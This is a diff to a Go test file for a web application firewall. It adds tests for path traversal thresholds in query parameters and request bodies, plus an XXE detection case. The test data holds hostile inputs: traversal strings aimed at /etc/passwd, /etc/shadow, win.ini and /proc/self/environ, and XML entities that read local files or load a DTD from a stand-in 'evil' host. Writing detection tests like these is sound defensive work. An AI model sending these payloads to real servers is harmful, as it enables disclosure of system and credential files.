@@ -108,6 +108,36 @@ func TestWAF_InspectsArgsAndForms(t *testing.T) {
 	}
 }
 
+// TestWAF_PathTraversalInQueryAndBody verifies that single traversal sequences
+// in query args or body parameters are blocked (Rule 10006).
+func TestWAF_PathTraversalInQueryAndBody(t *testing.T) {
+	h := wafTestHandler(t)
+
+	// Single ../ and ..\ in query params must be blocked
+	traversalCases := []string{
+		"/download?file=../secret.txt",
+		"/download?file=..%2fsecret.txt",
+		`/download?file=..\secret.txt`,
+		"/download?file=../../../../etc/passwd",
+	}
+	for _, tc := range traversalCases {
+		if code := wafDo(t, h, http.MethodGet, tc, "", ""); code != http.StatusForbidden {
+			t.Errorf("path traversal %q not blocked: got %d, want 403", tc, code)
+		}
+	}
+
+	// Benign queries with double dots (not followed by a slash) must pass
+	benignCases := []string{
+		"/search?q=version..2",
+		"/items?range=1..10",
+	}
+	for _, bc := range benignCases {
+		if code := wafDo(t, h, http.MethodGet, bc, "", ""); code != http.StatusOK {
+			t.Errorf("benign double-dot %q wrongly blocked: got %d, want 200", bc, code)
+		}
+	}
+}
+
 // TestWAF_InspectsRequestURI is a regression test for VULN-M01: the built-in
 // ruleset only inspected ARGS (query-string/body params), never REQUEST_URI,
 // so a payload embedded directly in a REST path segment (/api/orders/{payload}
@@ -399,6 +429,7 @@ func TestScreenXXE_DetectsAndRewinds(t *testing.T) {
 	}{
 		{"xxe system", "application/xml", `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`, true},
 		{"xxe public", "application/xml", `<!DOCTYPE r PUBLIC "-//x" "http://evil/x">`, true},
+		{"xxe with comment padding", "application/xml", "<!-- " + strings.Repeat("PADDING ", 2000) + " -->\n<!DOCTYPE r SYSTEM \"http://evil/x.dtd\"><r/>", true},
 		{"benign with decl", "application/xml", `<?xml version="1.0"?><order><id>42</id></order>`, false},
 		{"sqli in xml, no xxe", "application/xml", `<r>1 UNION SELECT password FROM users</r>`, false},
 		{"non-xml content-type", "application/json", `{"note":"<!DOCTYPE x SYSTEM y>"}`, false},
@@ -587,4 +618,77 @@ func TestRedactWAFURI(t *testing.T) {
 			}
 		})
 	}
+}
+
+// Rule 10006 was one rule over ARGS, REQUEST_URI and REQUEST_BODY with a single
+// threshold, and no single threshold is right for all three.
+//
+// Requiring two climbs missed `..\windows\win.ini`. Accepting one climb denied
+// `{"path":"../config"}` with a CRITICAL 403 — an ordinary relative path in an
+// ordinary body, the kind a build config, a submitted import statement or a
+// description field carries every day. An integration that gets a 403 on its
+// first deploy is an integration that turns the WAF off, and then nothing is
+// protected.
+//
+// The rule is now split: a parameter climbs for one reason only, so one climb
+// denies; a body is judged on depth or on a known target, the distinction the
+// rule's own /etc/passwd branch was already drawing. These tests pin both
+// halves, because the reason for the split lives in a comment and comments do
+// not fail the build.
+func TestWAF_PathTraversalThresholdDiffersByTarget(t *testing.T) {
+	h := wafTestHandler(t)
+
+	t.Run("a single climb in a parameter is denied", func(t *testing.T) {
+		for _, q := range []string{
+			"/download?file=../secret.txt",
+			`/download?file=..\secret.txt`,
+			"/download?file=..%2fsecret.txt",
+		} {
+			if code := wafDo(t, h, http.MethodGet, q, "", ""); code != http.StatusForbidden {
+				t.Errorf("%q: got %d, want 403 — a query field naming a file has no "+
+					"legitimate reason to climb", q, code)
+			}
+		}
+	})
+
+	t.Run("a single climb in a body is allowed", func(t *testing.T) {
+		for _, body := range []string{
+			`{"path":"../config"}`,
+			`{"import":"../shared/types"}`,
+			`{"note":"see ../docs/readme.md"}`,
+		} {
+			code := wafDo(t, h, http.MethodPost, "/api/items", "application/json", body)
+			if code == http.StatusForbidden {
+				t.Errorf("%s: denied with 403. A relative path in a body is not an "+
+					"attack, and denying it is how a customer learns to disable the WAF", body)
+			}
+		}
+	})
+
+	t.Run("depth or a known target in a body is denied", func(t *testing.T) {
+		for _, body := range []string{
+			`{"path":"../../../../etc/passwd"}`,    // depth
+			`{"path":"..\\..\\windows\\system32"}`, // depth, Windows separators
+			`{"path":"../etc/shadow"}`,             // one climb, known target
+			`{"path":"..\\windows\\win.ini"}`,      // one climb, known target
+			`{"path":"/proc/self/environ"}`,        // direct target
+		} {
+			code := wafDo(t, h, http.MethodPost, "/api/items", "application/json", body)
+			if code != http.StatusForbidden {
+				t.Errorf("%s: got %d, want 403", body, code)
+			}
+		}
+	})
+
+	t.Run("a substring of a known target is not a target", func(t *testing.T) {
+		for _, body := range []string{
+			`{"call":"win.initialize()"}`,
+			`{"file":"../lib/win.iniX"}`,
+		} {
+			code := wafDo(t, h, http.MethodPost, "/api/items", "application/json", body)
+			if code == http.StatusForbidden {
+				t.Errorf("%s: denied with 403 on a substring match", body)
+			}
+		}
+	})
 }
